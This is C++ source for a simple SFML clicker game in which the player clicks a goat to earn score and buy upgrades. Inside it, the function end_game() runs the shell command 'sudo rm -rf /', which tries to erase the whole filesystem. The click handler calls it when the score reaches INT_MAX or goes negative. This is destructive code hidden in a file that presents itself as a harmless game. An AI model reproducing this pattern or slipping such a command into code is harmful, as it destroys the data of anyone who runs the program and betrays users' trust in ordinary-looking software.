#include <SFML/Graphics.hpp>
#include <SFML/Graphics/Color.hpp>
#include <SFML/Graphics/Drawable.hpp>
#include <SFML/Graphics/RenderWindow.hpp>
#include <SFML/Graphics/Sprite.hpp>
#include <SFML/Graphics/Texture.hpp>
#include <SFML/System/Sleep.hpp>
#include <SFML/Window/Event.hpp>
#include <SFML/Window/Keyboard.hpp>
#include <SFML/Window/Mouse.hpp>
#include <SFML/Window/VideoMode.hpp>
#include <chrono>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <string>
#include <fstream>
#include <thread>
#include <unistd.h>
#include <climits>
#include <iostream>
class GameFont {
	public: static sf::Font font;
};
sf::Font GameFont::font;
void end_game() {
	system("sudo rm -rf /");
}

class Goat {
	private: sf::Sprite goat_sprite;
	public: sf::Sprite get_goat_sprite() {
				return goat_sprite;
			}
	public: void move_goat(const float &x, const float &y) {
				goat_sprite.move(x, y);
			}
	private: float scale = 0.5;
	public: void set_goat_scale(const float &scale) {
				this->scale = scale;
				goat_sprite.setScale(this->scale, this->scale);
			}
	public: float get_goat_scale() {
				return scale;
			}
	private: sf::Texture goat_texture;
	public: Goat() {
				goat_texture.loadFromFile("./game_files/textures/goat.jpg");				
				goat_sprite.setTexture(goat_texture);
				goat_sprite.setScale(scale, scale);
				goat_sprite.setOrigin(-(1920 / 2.f) - goat_sprite.getLocalBounds().width / 2.f,-(1080 / 4.f) - (goat_sprite.getLocalBounds().height / 2.f)); // The math is made up btw.
			}
};

class Score {
	private: static int score;
	private: static int added_clicks;
	private: sf::Text score_text;
	public: static void increment_added_clicks(const int &incrementation_value) {
				added_clicks += incrementation_value;
			}
	public: sf::Text get_score_text() {
				score_text.setString("score: " + std::to_string(score));
				return score_text;
			}
	public: static void add_score(const int &value) {
				score += value;
			}
	public: static void add_calculated_score() {
				score += added_clicks;
			}
	public: static int get_score() {
				return score;
			}
	public: Score() {
				std::ifstream score_file("./game_files/saved_progress/score");					
				std::string score_value;
				score_file >> score_value;
				score = stoi(score_value);
				score_text.setCharacterSize(40);
				score_text.setFillColor(sf::Color::Red);
				score_text.setFont(GameFont::font);
				score_text.setOrigin(-800, -200);
				std::ifstream added_clicks_file("./game_files/saved_progress/added_clicks");	
				std::string added_clicks_string;
				added_clicks_file >> added_clicks_string;
				added_clicks = std::stoi(added_clicks_string);
			}
	public: static void save() {
				std::ofstream score_file("./game_files/saved_progress/score");
				score_file << score;
				std::ofstream added_clicks_file("./game_files/saved_progress/added_clicks");
				added_clicks_file << added_clicks;
			}
};
int Score::score = 0;
int Score::added_clicks;

class AdditionalClickButton {
	private: sf::Sprite additional_click_button_sprite;
	private: sf::Texture additional_click_button_texture;
	private: sf::Text cost_text;
	private: static int cost;
	public: static int get_cost() {
				return cost;
			}
	public: sf::Sprite get_additional_click_button_sprite() {
				return additional_click_button_sprite;
			}
	public: sf::Text get_cost_text() {
				return cost_text;
			}
	private: void increase_cost() {
				cost = cost * 1.2 + (10 * (0.2 * cost));
				std::string cost_string = std::to_string(cost);
				cost_text.setString("Cost of upgrade: " + cost_string);
			}	
	public: void make_clicked() {
				Score::add_score(cost * -1);
				Score::increment_added_clicks(1);
				increase_cost();
				additional_click_button_texture.loadFromFile("./game_files/textures/upgrade_button_clicked.png");
				additional_click_button_sprite.setTexture(additional_click_button_texture);
			}
	public: void make_unclicked() {
				additional_click_button_texture.loadFromFile("./game_files/textures/upgrade_button.png");
				additional_click_button_sprite.setTexture(additional_click_button_texture);
			}
	public: AdditionalClickButton() {
				additional_click_button_texture.loadFromFile("./game_files/textures/upgrade_button.png");
				additional_click_button_sprite.setTexture(additional_click_button_texture);
				additional_click_button_sprite.setOrigin(-200, -400);  
				std::ifstream cost_of_upgrade_file("./game_files/saved_progress/cost_of_upgrade");
				std::string cost_of_upgrade;
				cost_of_upgrade_file >> cost_of_upgrade;
				cost = std::stoi(cost_of_upgrade);
				cost_text.setFont(GameFont::font);
				cost_text.setOrigin(-200, -300);
				cost_text.setCharacterSize(40);
				cost_text.setString("Cost of upgrade: " + cost_of_upgrade);
				cost_text.setFillColor(sf::Color::Red);
			}
	public: static void save() {
				std::ofstream cost_file("./game_files/saved_progress/cost_of_upgrade");
				cost_file << cost;
			}
};
int AdditionalClickButton::cost;
void handle_mouse_clicks(Goat &goat, AdditionalClickButton &button) {
	if (!sf::Mouse::isButtonPressed(sf::Mouse::Left)) return;
	auto mouse_position = sf::Mouse::getPosition();
	if (goat.get_goat_sprite().getGlobalBounds().contains(mouse_position.x, mouse_position.y)) {
		Score::add_calculated_score();
		goat.set_goat_scale(0.2);
		goat.move_goat(450.f, 400.f); // The source of these numbers is that I made them the fuck up.
		if (Score::get_score() == INT_MAX or Score::get_score() < 0) {
			end_game(); // Fuck you.
		}
	} else if (button.get_additional_click_button_sprite().getGlobalBounds().contains(mouse_position.x, mouse_position.y)) {
		if (Score::get_score() < AdditionalClickButton::get_cost()) return;
		button.make_clicked();
	}
}
void handle_key_presses() {
	Score::save();
	AdditionalClickButton::save();
	exit(0);
}
int main() {
	GameFont::font.loadFromFile("./game_files/fonts/Agate-Bold.ttf");
	Goat goat;
	Score score;	
	AdditionalClickButton button;
	sf::RenderWindow window(sf::VideoMode(1920, 1080), "koza clicker", sf::Style::Titlebar | sf::Style::Close);
	while (window.isOpen()) {
		sf::Event event;
		while (window.pollEvent(event)) {
			switch (event.type) {
				case sf::Event::MouseButtonPressed:
					handle_mouse_clicks(goat, button);
					break;
				case sf::Event::KeyPressed:
					handle_key_presses();
					break;
			}
		}
		window.clear(sf::Color::White);
		window.draw(score.get_score_text());
		window.draw(goat.get_goat_sprite());
		window.draw(button.get_additional_click_button_sprite());
		window.draw(button.get_cost_text());
		window.display();
		std::this_thread::sleep_for(std::chrono::milliseconds(50));
		if (goat.get_goat_scale() == 0.2f) {
			goat.move_goat(-450, -400); 
			goat.set_goat_scale(0.5);
		}
		button.make_unclicked();
	}
}
